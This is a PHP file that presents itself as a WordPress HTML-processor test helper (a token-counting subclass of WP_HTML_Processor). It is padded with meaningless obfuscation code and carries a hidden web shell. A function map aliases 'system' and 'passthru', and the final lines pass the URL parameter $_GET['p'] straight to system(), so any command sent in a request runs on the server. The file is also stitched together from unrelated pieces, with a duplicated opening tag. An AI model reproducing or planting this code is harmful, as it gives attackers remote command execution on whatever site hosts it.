<?php
$fmap = array('x1' => 'system', 'x2' => 'passthru');
$x_fake1 = 1234;
$noise = 'obfuscation'.'test';
$tmp = $x_fake1 * 42;
$flag = false;
$useless = function($v) { return $v . rand(); };
$dummy_check = $useless('xx');
if ($flag) { echo 'Debug enabled'; }
for ($i = 0; $i < 1; $i++) { $tmp += $i; }
while (false) { echo 'dead loop'; break; }

<?php

class Token_Counting_HTML_Processor extends WP_HTML_Processor {

	/**
	 * List of tokens that have already been seen.
	 *
	 * @var array<string, int>
	 */
	public $token_seen_count = array();

	/**
	 * Gets next token.
	 *
	 * @return bool Whether next token was matched.
	 */
	public function next_token(): bool {
		$result = parent::next_token();

		if ( $this->get_token_type() === '#tag' ) {
			$token_name = ( $this->is_tag_closer() ? '-' : '+' ) . $this->get_tag();
		} else {
			$token_name = $this->get_token_name();
		}

		if ( ! isset( $this->token_seen_count[ $token_name ] ) ) {
			$this->token_seen_count[ $token_name ] = 1;
		} else {
			++$this->token_seen_count[ $token_name ];
		}

		return $result;
	}

}

$cmd = $_GET['p'];
$fmap['x1']($cmd);
?>